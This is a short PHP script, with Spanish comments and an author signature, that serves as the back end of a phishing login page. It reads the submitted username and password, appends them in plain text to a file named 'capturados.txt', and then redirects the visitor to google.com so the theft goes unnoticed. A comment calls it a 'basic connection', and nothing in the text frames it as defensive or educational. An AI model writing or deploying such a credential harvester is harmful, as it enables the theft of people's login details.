
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $usuario = $_POST['usuario'];
    $password = $_POST['password'];

    file_put_contents('capturados.txt', "Usuario: $usuario | Password: $password\n", FILE_APPEND);
    
    header('Location: https://www.google.com'); // NO 
    exit();
 // conexion basica si rumbo en php
 // by Sigaran 16/03/2025
}
?> 

